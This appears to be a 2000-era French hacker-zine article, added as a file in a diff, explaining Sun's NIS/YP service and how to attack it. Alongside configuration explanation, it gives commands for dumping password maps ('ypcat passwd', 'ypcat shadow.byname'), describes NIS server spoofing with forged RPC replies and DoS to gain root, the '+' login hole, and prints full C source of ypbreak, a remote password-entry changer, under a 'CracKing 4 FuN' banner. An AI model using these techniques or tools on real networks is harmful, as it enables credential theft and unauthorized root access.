@@ -1,0 +1,702 @@
+/*---------------------------------------------------------------------------
+
+                                        NIS               
+
+                         %% Network Information Service %%
+
+                                    by DataHck
+
+								     13/02/00
+
+-----------------------------------------------------------------------------*/
+
+<:: Overview ::>
+
+Le NIS, anciennement appelé YP ou Yellow Pages, a été développé par Sun
+pour simplifier la mise en place d'un réseau unix. Le principe, c k'il existe
+un serveur, sur lequel sont stockés les filez de config (passwd entre autre ;))
+pour *TOUTES* les bécanes clientes.
+
+Plutot ke d'avoir à modifier son passwd sur chaque machine, on utilise donc un 
+serveur NIS (ou meme plusieurs si le nombre de requêtes est important).
+
+
+          NIS CLIENT                                    NIS SERVER
+   ##########################                   ##########################
+   #  ____________________  #                   #  ____________________  #
+   # |   CLIENT PROCESS   | #                   # |   SERVER PROCESS   | #
+   # |____________________| #                   # |____________________| #
+   #   |        __________  #                   #  __________        |   # 
+   #   |       | TCP |    | #     Requête       # |    | TCP |       |   #
+   # [RPC] <-> | --- | IP | # ----------------> # | IP | --- | <-> [RPC] #
+   #           | UDP |    | # <---------------- # |    | UDP |           #
+   #           |_____|____| #     Réponse       # |____|_____|           # 
+   #                        #                   #                        #
+   ##########################                   ##########################
+
+
+Le but du NIS est de fournir une database au rézo entier (passwd, group, hosts)
+
+                                Serveur NIS
+                                    |
+                                    |
+                                 [Login]
+                                    |
+                           _________|____________
+                          |         |            |
+                       Client1   Client2 ... ClientN
+
+
+Une modification sur le serveur NIS, et ce sont tous les clients qui seront 
+affectés. Génial non ? :)
+
+Le NIS est basé sur le protocole RPC (Remote Procedure Call) comme indiqué sur 
+le schéma.
+
+Il supporte 3 niveaux de sécu :
+level 0: Aucune vérification (ou presque)
+level 1: "Trusted host" + User id
+level 2: Cryptage DES (Data Encryption Standard) password + clé publique/privée
+
+On peut refuser ou restreindre l'acces au serveur NIS à certaines machines pour
+un map donné. (+ secure)
+Tout est configuré dans le /etc/ypserv.conf
+
+Exemple :
+
+# /etc/ypserv.conf
+# Host                       : Map              : Security   : Passwd_mangle
+*			     : shadow.byname    : port       : yes
+
+Ici on bloque l'accès à toutes les machines pour le map shadow.byname (passwd 
+shadowed).
+
+Le prog de config du NIS génère un 'plan' du rézo en 3 fichiers :
+/etc/hosts         # IP + nom des machines
+/etc/hosts.byname  # nom des machines
+/etc/hosts.byaddr  # IP des machines
+
+Par défaut, les filez de config sont lisibles par tout le monde et le niveau de
+sécu est le level 0. =)
+
+La différence entre NIS et NIS+ ?
+Bahhh elle se situe dans la structure : 
+- le NIS utilise des maps (IP + nom de machine).
+- le NIS+ utilise des tables (matrices) : les lignes sont des entrées (une 
+  entrée peut etre un lien vers une autre table), en colonne, les propriétés.
+  Le NIS+ supporte le cryptage des données et l'authentification directe.
+
+Le NIS+ est évidemment + secure et + récent ke le NIS.
+
+Vala, on a vu en gros à koi ca servait. Now, on va s'attaquer à chacune des 
+2 parties : le serveur & le client.
+
+<:: Le Serveur ::>
+
+ypserv ou ypbind est le daemon coté serveur, il surveille le traffic pour les 
+requêtes RPC des clients NIS.
+La config se trouve en /etc/yp.conf
+
+Exemple:
+	# /etc/yp.conf - ypbind configuration file
+	server          popeye2.univ-xxxxxxx.fr
+	ypserver        popeye2.univ-xxxxxxx.fr
+	domain          univ-xxxxxxx.fr
+
+On peut changer le nom de domaine directement avec la commande : 
+'/bin/domainname <nis.domain>'
+
+D'habitude, les admins ont tendance à mettre un nom de domaine NIS différent 
+de celui du réseau pour éviter k'il soit *facilement* retrouvé.
+
+Bahhh vous pouvez essayer la commande 'ypdomainname' avec les options :
+	-y : donne le nom de domaine NIS (c tres con hein ;))
+	-d : le DNS
+	-a : les aliases (nom)
+	-i : votre ip :)
+Mais bon, en général, suffit de regarder lors du boot de la machine (en local).
+
+Pour vérifier ke l'ypbind est en place, on fait un 'rpcinfo -p <machine>'.
+Là on recoit : 
+	       100007    2   udp    637  ypbind
+               100007    2   tcp    639  ypbind
+
+Pour connaitre sa version, 'rpcinfo -u <machine> ypbind'
+On recoit : 
+      	       program 100007 version 2 ready and waiting
+
+Le file /etc/nsswitch.conf détermine l'ordre des lookups lors d'une requête.
+
+Par défaut, on a le file suivant :
+
+# /etc/nsswitch.conf
+#
+# An example Name Service Switch config file. This file should be
+# sorted with the most-used services at the beginning.
+#
+# The entry '[NOTFOUND=return]' means that the search for an
+# entry should stop if the search in the previous entry turned
+# up nothing. Note that if the search failed due to some other reason
+# (like no NIS server responding) then the search continues with the
+# next entry.
+#
+# Legal entries are:
+#
+#	nisplus or nis+		Use NIS+ (NIS version 3)
+#	nis or yp		Use NIS (NIS version 2), also called YP
+#	dns			Use DNS (Domain Name Service)
+#	files			Use the local files
+#	db			Use the local database (.db) files
+#	compat			Use NIS on compat mode
+#	[NOTFOUND=return]	Stop searching if not found so far
+#
+# To use db, put the "db" in front of "files" for entries you want to be
+# looked up first in the databases
+#
+# Example:
+#passwd:    db files nisplus nis
+#shadow:    db files nisplus nis
+#group:     db files nisplus nis
+
+passwd:     files nisplus nis
+shadow:     files nisplus nis
+group:      files nisplus nis
+
+#hosts:     db files nisplus nis dns
+hosts:      files nisplus nis dns
+
+services:   nisplus [NOTFOUND=return] files
+networks:   nisplus [NOTFOUND=return] files
+protocols:  nisplus [NOTFOUND=return] files
+rpc:        nisplus [NOTFOUND=return] files
+ethers:     nisplus [NOTFOUND=return] files
+netmasks:   nisplus [NOTFOUND=return] files     
+bootparams: nisplus [NOTFOUND=return] files
+
+netgroup:   nisplus
+publickey:  nisplus
+automount:  files nisplus
+aliases:    files nisplus
+
+# EOF
+
+Si on remplace l'entrée hosts par "hosts: files nis dns" alors les fonctions 
+lookups vont d'abord regarder le file /etc/hosts (local) puis sur le NIS et 
+finalement sur le DNS.
+En général, on le laisse tel kel.       
+
+Le NIS est souvent associé au NFS, alors faites un ptit showmount pour voir si 
+qq réps ne sont pas exportés. ;)
+
+
+<:: Coté Client ::>
+
+Le daemon ypbind doit toujours être lancé pour accéder au serveur NIS.
+
+1) ypcat/ypmatch
+
+La commande 'ypcat' affiche toutes les entrées dans la database du serveur NIS.
+Avec l'option -x, on a la table de "translation" :
+
+	Use "ethers"    for map "ethers.byname"
+	Use "aliases"   for map "mail.aliases"
+	Use "services"  for map "services.byname"
+	Use "protocols" for map "protocols.bynumber"
+	Use "hosts"     for map "hosts.byaddr"
+	Use "networks"  for map "networks.byaddr"
+	Use "group"     for map "group.byname"
+	Use "passwd"    for map "passwd.byname"
+
+...ki se trouve en fait dans /var/yp/nicknames :
+
+	# /var/yp/nicknames
+	passwd		passwd.byname
+	group		group.byname
+	networks	networks.byaddr
+	hosts		hosts.byaddr
+	protocols	protocols.bynumber
+	services	services.byname
+	aliases		mail.aliases
+	ethers		ethers.byname
+	# EOF
+
+Il suffit donc de faire 'ypcat passwd' pour chopper le passwd complet (en 
+général, non-shadowed =)). 
+Aussi, si le passwd est kan meme shadowed, la commande 'ypcat shadow' marchera 
+pas, c 'ypcat shadow.byname' k'il faut utiliser.
+Cependant, n'oubliez pas ke syslogd tourne toujours, et tout sera loggé ;(
+
+Pour chopper les infos sur un account (si le 'ypcat passwd' marche pas) :
+
+       /* CUT HERE */
+       #include <stdio.h>
+       #include <pwd.h>
+       #include <sys/types.h>
+
+       int main(int argc, char *argv[])
+       {
+         struct passwd *pwd;
+
+         if(argc != 2)
+           {
+             fprintf(stderr,"Usage: getwpnam username\n");
+             exit(1);
+           }
+
+         pwd=getpwnam(argv[1]);
+
+         if(pwd != NULL)
+           {
+             printf("name.....: [%s]\n",pwd->pw_name);
+             printf("password.: [%s]\n",pwd->pw_passwd);
+             printf("user id..: [%d]\n",pwd->pw_uid);
+             printf("group id.: [%d]\n",pwd->pw_gid);
+             printf("gecos....: [%s]\n",pwd->pw_gecos);
+             printf("directory: [%s]\n",pwd->pw_dir);
+             printf("shell....: [%s]\n",pwd->pw_shell);
+           }
+         else
+           fprintf(stderr,"User \"%s\" not found!\n",argv[1]);
+
+         exit(0);
+       }
+       /* CUT HERE */
+
+ou alors 'getent passwd [login]'
+login n'est pas obligatoire (ca renvoie alors tout le /etc/passwd).
+
+Un map intéressant également, c le file /etc/hosts.
+En faisant 'ypcat hosts' on obtient la liste complète de toutes les bécanes
+(nom + IP). 8)
+
+2) yppoll/ypwhich
+
+Retourne la version et/ou le nom du serveur 'maitre' d'un map NIS.
+
+3) ypchsh, ypchfn, yppasswd
+
+Permettent de modifier la config de votre account sur le serveur NIS.
+Ce sont les memes toolz k'en local mais pour le NIS.
+
+ypchsh   : Changer de Shell
+ypchfn   : Changer de Full Name (GECOS information)
+yppasswd : Changer de Password
+
+4) /etc/passwd
+
+Un exemple de passwd file en LOCAL (sur la machine cliente) :
+
+# /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/adm:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:
+news:x:9:13:news:/var/spool/news:
+uucp:x:10:14:uucp:/var/spool/uucp:
+operator:x:11:0:operator:/root:
+games:x:12:100:games:/usr/games:
+gopher:x:13:30:gopher:/usr/lib/gopher-data:
+ftp:x:14:50:FTP User:/home/ftp:
+nobody:x:99:99:Nobody:/:
+gdm:x:42:42::/home/gdm:/bin/bash
+xfs:x:100:233:X Font Server:/etc/X11/fs:/bin/false
++
+
+^ Remarquez le petit + à la fin du file, il indique ke le file est "incomplet",
+si le login entré n'est pas trouvé en local, il le sera surement en remote via 
+le serveur NIS.
+
+
+<:: NIS Server Spoofing ::>
+
+Le but : bahhhh, prend la place du serveur NIS :o)
+Le NIS/RPC utilise en premier le proto UDP, donc, facile à spoofer.
+Il faut donc, spoofer le serveur, et générer un fake-reply à une request client
+AVANT ke le vrai serveur le fasse :/ (ou alors faudrait le killer)
+
+Comment intercepter les requests clientes ?
+Bahhh, y'a pas 36 solutions -> sniffer !
+
+Le principe :
+
+      ##########                 (RPC Request)                     ########## 
+      #	 NIS   #-------------------------------------------------> #  NIS   #
+      #        #                                                   #        #
+      #	CLIENT #<---------------------<[---------------<---------- # SERVER # 
+      ##########    (Fake RPC-reply)  |	          (RPC Reply)      ##########
+		                      |
+                                 ############                                 
+                                 # INTRUDER #  (Sniffer)
+                                 ############ 			
+
+On peut donc, par exemple, chopper le root sur n'importe kelle bécane cliente.
+
+Une belle demo de tout ceci, c le programme ypfake.
+Ce prog surveille le traffic du rézo, et spécialement, les requêtes clientes 
+de 2 usernames + userid prédéfinis vers le serveur NIS. Dès k'il en choppe une,
+il forge un packet dont l'IP source est celle du serveur NIS, avec une fausse 
+réponse des entrées du file /etc/passwd. 
+2 users sont créés, un user normal, juste pour se logger sur la machine, et un
+2e ki a le uid 0, tous les 2 ont comme pass leur username :)
+
+On peut donc add des users (uid0 de préférence ;)) *virtuellement* puisque le 
+client n'attend qu'UNE SEULE REPONSE de la part du serveur, s'il en recoit une 
+2e, elle sera ignorée. :P
+
+De plus, de nombreuses implementations du NIS ne fournissent pas (ou peu) de
+controle d'accès. Cad, n'importe kelle host ki émet une requête va recevoir une
+réponse du serveur (il faut pour cela connaitre le nom de domaine NIS).
+
+Il faut juste donc etre + rapide ke le vrai serveur :P
+Bahhhh pour ca on peut tricher un peu en floodant ou carrément avec des DoS :)
+
+<:: NIS Client Spoofing ::>
+
+Bon, là c l'inverse, on spoofe le client.
+Pk ? bahhh pour chopper le passwd !
+Suffit de prendre une ip faisant partie des hosts 'reconnues' and wala !
+
+Ps: j'ai encore jamais vu cette technique mais, si vous avez des infos, mail to
+    datahck@mail.com
+
+<:: NIS Server Security-Holes ::>
+
+Une faille très connue, c celle du "+::0:0::" à la fin d'un file /etc/passwd.
+Les entrées +, -, et @ servent à inclure (+) ou exclure (-) des entrées du NIS 
+map dans le file /etc/passwd local. Par exemple, avec -guest::::: l'user guest 
+ne pourra pas se connecter. Pour un groupe, on ajoute le @ (-@guest:::::)
+Pour ce ki est de la faille, il suffit d'essayer de se logger en telnet avec 
+l'account "+" :)
+Note: c vieux comme technique, alors vous attendez pas à chopper le r00t sur 
+bcp de bécanes avec ca :P
+
+/* YPBREAK.C */
+
+Bahhhh jcrois ke l'explication de l'auteur sur l'objectif de ce prog est assez 
+clair non ? :)
+Un grand merci à prfalken, ki a porté le prog sous nux.
+
+!! WARNING !!
+Ce prog ne marche pas kan le passwd est shadowed (c un peu normal hein :I)
+Il suffirait d'add le prog unshadow.c pour retrouver la structure d'un passwd
+file *correct*.
+Au fait, il faut connaitre le password de l'account k'on veut modifier.
+
+
+/* remote yppasswd type program 
+ * lets you change username, password, gecos and/or shell
+ * remotely via the yppasswd daemon.
+ * (note daemon may not accept all of your changes)
+ * 
+ *  cc ypbreak.c -o ypbreak -lrpcsvc -lcrypt -lnss_nis
+ *  progname ypmaster ypdomain
+ *  
+ *  fixed to linux by prfalken, OrganiKs Crew <prfalken@freeshell.org>
+ *  
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <rpc/rpc.h>
+#include <rpcsvc/yppasswd.h>
+#include <rpcsvc/yp_prot.h>
+#define TIMEOUT 15
+ 
+extern char *get_yp_map();
+extern char *crypt(const char *key, const char *salt);
+
+void decodeans(int ok, char *master);
+void print_pwd(struct passwd p);
+void print_rpc_err(int errcode);
+ 
+char *split(char *s)
+{
+    while ((*s != 0) && (*s != ':'))
+        s++;
+    if (*s == 0)
+        return s;
+    *s = 0;
+    return(s+1);
+}
+
+void changes(struct passwd *p)
+{
+    int done=0, choice;
+    char s[100];
+    while(!done) {
+        printf("0. quit\n");
+        printf("1. name\n");
+        printf("2. password\n");
+        printf("3. gecos\n");
+        printf("4. shell\n");
+        printf("choice> ");
+        fflush(stdout);
+        choice = fgetc(stdin);
+        scanf("%*c");   /* flush last <enter> */
+        switch(choice) {
+            case '0':
+                done++;
+                break;
+            case '1':
+                bzero(s, 100);
+                printf("New name: ");
+                fgets(s, 99, stdin);
+                s[strlen(s)-1] = 0;
+                strncpy(p->pw_name, s, 99);
+                break;
+            case '2':
+                bzero(s, 100);
+                printf("New pass: ");
+                fgets(s, 8, stdin);
+                printf("%s\n", crypt(s, "AE"));
+                strncpy(p->pw_passwd, crypt(s, "AE"), 13);
+                break;
+            case '3':
+                bzero(s, 100);
+                printf("New finger info: ");
+                fgets(s, 99, stdin);
+                s[strlen(s)-1] = 0;
+                strncpy(p->pw_gecos, s, 99);
+                break;
+            case '4':
+                bzero(s, 100);
+                printf("New shell: ");
+                fgets(s, 99, stdin);
+                s[strlen(s)-1] = 0;
+                strncpy(p->pw_shell, s, 99);
+                break;
+            default:
+                printf("Invalid Choice.\n");
+                break;
+        }
+        fflush(stdout);
+    }
+}
+
+/* put string st into passwd structure */
+void getpw(struct passwd *p, char *st)
+{
+    char *s, *t;
+    s = split(st);
+    strncpy(p->pw_name, st, 99);
+
+    t = split(s);
+    strncpy(p->pw_passwd, s, 19);
+
+    s = split(t);
+    p->pw_uid = atoi(t);
+
+    t = split(s);
+    p->pw_gid = atoi(s);
+
+    s = split(t);
+    strncpy(p->pw_gecos, t, 99);
+
+    t = split(s);
+    strncpy(p->pw_dir, s, 99);
+
+    s = split(t);
+    strncpy(p->pw_shell, t, 49);
+}
+ 
+void timeout();
+char *getpass();
+
+int main(int argc, char **argv)
+{
+    struct yppasswd yppasswd;
+    struct passwd p;
+    int len, ok, ans;
+    enum clnt_stat errcode;
+    char temp[100], a[100], b[20], c[100], d[100], e[50];
+    char space[100];
+    struct ypreq_key key;
+    struct ypresp_val answer;
+    char *domain, *master;
+    char *pass;
+ 
+    if (argc != 3) {
+        printf("Usage: %s server domain\n",argv[0]);
+        exit(1);
+    }
+
+    master = argv[1];
+    domain = argv[2];
+
+    bzero(a, 100);
+    bzero(b, 20);
+    bzero(c, 100);
+    bzero(d, 100);
+    bzero(e, 50);
+    bzero(space, 100);
+ 
+    answer.valdat.valdat_val = space;   /* where our answer will be */
+    p.pw_name = a;                      /* we need space! */
+    p.pw_passwd = b;
+    p.pw_gecos = c;
+    p.pw_dir = d;
+    p.pw_shell = e;
+  
+    bzero(temp, 100);
+    printf("Enter account name : ");
+    fgets(temp, 99, stdin);
+    temp[strlen(temp)-1] = 0;
+ 
+    key.domain = domain;
+    key.map = "passwd.byname";
+    key.keydat.keydat_val = temp;
+    key.keydat.keydat_len = strlen(temp);
+  
+    signal(SIGALRM, timeout);
+    alarm(TIMEOUT);
+
+    errcode = callrpc(master, YPPROG, YPVERS, YPPROC_MATCH,
+                      (xdrproc_t)xdr_ypreq_key, (caddr_t)&key,
+                      (xdrproc_t)xdr_ypresp_val, (caddr_t)&answer);
+
+    alarm(0);
+
+    if (errcode != RPC_SUCCESS)
+        print_rpc_err(errcode);
+
+    if (answer.status == TRUE ) {   /* we have a match */
+        len = answer.valdat.valdat_len;
+        answer.valdat.valdat_val[len] = 0;   /* null terminate */
+        getpw(&p, answer.valdat.valdat_val);
+        print_pwd(p);
+    } else {
+        printf("User %s not found.\n", temp);
+        exit(1);
+    }
+
+    pass = getpass("Password:");
+
+    changes(&p);
+    print_pwd(p);
+
+    printf("Is this ok? [y/n] : ");
+
+    if (fgetc(stdin) != 'y') {
+        printf("foo\n");
+        return 0;
+    }
+
+    yppasswd.oldpass = pass;
+    yppasswd.newpw = p;
+  
+/* All the work is done here, now we try to actually do it */
+    ans = callrpc(master, YPPASSWDPROG, YPPASSWDVERS, YPPASSWDPROC_UPDATE,
+                  (xdrproc_t)xdr_yppasswd, (caddr_t)&yppasswd,
+                  (xdrproc_t)xdr_int, (caddr_t)&ok);
+
+    if (ans != 0) {
+        fprintf(stderr, "RPC call didnt go through.\n");
+        exit(1);
+    }
+
+    if (ok == 1) {
+        fprintf(stderr, "Remote site wouldnt change pw entry (wrong pw?)\n");
+    }
+
+    if (ok != 0) {
+        decodeans(ok, master);
+        exit(1);
+    }
+
+    return 0;
+}
+ 
+ 
+#define MAXMSG 17
+char *msgs[]=
+{
+    "No error",                             /*0*/
+    "Error from pre 4.1 version",           /*1*/
+    "Password incorrect",                   /*2*/ /*really login incorrect but why say so*/
+    "No changeable fields were changed",    /*3*/
+    "No password in adjunct",               /*4*/
+    "Bad password in adjunct",              /*5*/
+    "Inconsistency in adjunct",             /*6*/
+    "Password incorrect",                   /*7*/
+    "Password file busy -- try again later",/*8*/
+    "Password temp file open error -- contact system administrator",    /*9*/
+    "Password temp file fdopen error -- contact system administrator",  /*10*/
+    "Password adjunct file fopen error -- contact system administrator",/*11*/
+    "Password file fopen error -- contact system administrator",        /*12*/
+    "Password temp file fputs failed; disk partition may be full on NIS master! -- contact system administrator",   /*13*/
+    "Password temp file ferror is set; disk partition may be full on NIS master! -- contact system administrator",  /*14*/
+    "Password temp file fflush failed; disk partition may be full on NIS master! -- contact system administrator",  /*15*/
+    "Password adjunct file rename failed; disk partition may be full on NIS master! -- contact system administrator",/*16*/
+    "Password file rename failed; disk partition may be full on NIS master! -- contact system administrator",       /*17*/
+};
+
+void decodeans(int ok, char *master)
+{
+    if ((ok < 0) || (ok > MAXMSG))
+        fprintf(stderr, "Remote %s error %d\n", master, ok);
+    else
+        fprintf(stderr, "Error from %s: %s \n", master, msgs[ok]);
+}
+ 
+
+void print_pwd(struct passwd p)
+{
+    printf("%s:%s:%d:%d:%s:%s:%s\n", \
+            p.pw_name, p.pw_passwd, p.pw_uid, p.pw_gid, \
+            p.pw_gecos, p.pw_dir, p.pw_shell);
+}
+ 
+ 
+void print_rpc_err(int errcode)
+{
+    fprintf(stderr, "%s\n", clnt_sperrno(errcode));
+    exit(1);
+}
+ 
+void timeout(void)
+{
+    printf("RPC request (callrpc) timed out.\n");
+    exit(1);
+}
+
+/* EOF ypbreak.c */
+
+<:: Conclusion ::>
+
+Le NIS est un service utile et bien pratique, mais pas secure si on ne prend 
+pas soin de modifier les fichiers de config par défaut. Par exemple, laisser 
+le passwd accessible à tout le monde !
+De plus, si le serveur est crashé ou ne répond plus, aucun acces ne sera 
+autorisé. =)
+
+YPBINDPROC_DOMAIN: No bound server for domain xxx.xxxx.fr
+login: datahck
+Password:
+login incorrect
+
+
+<:: Da Greetz To ::>
+
+Lionel, prfalken, Lacrampe, cyberyo, hegemoOn, shado, jacko, exolon, dark_will,
+NoOoN, yawn, #organiks, #chx, #reseau, #bsdfr etc...
+
+Ah zuuuttt, on a oublié les lame-sentences !
+
+!! Respect Rulez !!                                      Knowledge is Power !!!
+
+			      CracKing 4 FuN !
+
+FUCK OPPRESSION...go to hell!                   FUCK REPRESSION...go to hell!	
+			      
+			      Save the whales !
+
+
+                      /!\ ~~ ph34r to OrganiKs ~~ /!\
+
